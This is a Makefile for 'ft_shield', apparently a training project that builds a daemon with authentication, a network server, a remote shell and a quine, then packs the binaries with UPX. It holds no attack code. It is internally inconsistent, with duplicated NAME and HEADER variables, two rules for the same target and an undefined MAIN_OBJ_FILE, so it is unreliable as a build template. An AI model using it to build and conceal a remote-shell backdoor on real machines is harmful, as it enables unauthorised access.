NAME = ./mandatory/ft_shield

CC = gcc
FLAGS = -g -Wall -Werror -Wextra
RM = rm -rf

FILES = mandatory/service.c mandatory/daemon.c mandatory/authentication.c mandatory/hash.c mandatory/server.c mandatory/shell.c mandatory/quine.c
MAIN_FILE = mandatory/main.c
OBJ_FILES = $(FILES:.c=.o)

MSG = Everything is fcleaned!
HEADER = ./mandatory/ft_shield.h
HEADER = ./src/tcp_server.h
NAME = ./src/ft_shield
MAIN_NAME = shield

# UPX packing
UPX = upx
UPX_FLAGS = --best --lzma 

all: $(NAME)

$(NAME): $(MAIN_FILE) $(HEADER) $(OBJ_FILES)
	$(CC) $(FLAGS) $(MAIN_FILE) $(OBJ_FILES) -o $(NAME)
	
$(NAME): $(OBJ_FILES) $(MAIN_OBJ_FILE)
	$(CC) $(OBJ_FILES) $(FLAGS) -o $(NAME)
	$(CC) $(MAIN_OBJ_FILE) $(FLAGS) -o $(MAIN_NAME)
	$(UPX) $(UPX_FLAGS) $(NAME) $(MAIN_NAME) 

%.o: %.c $(HEADER)
	$(CC) $(FLAGS) -c $< -o $@

clean:
	$(RM) -f $(OBJ_FILES)

fclean: clean
	$(RM) $(NAME)
	@echo $(MSG)

re: fclean all

.PHONY:  all clean fclean re
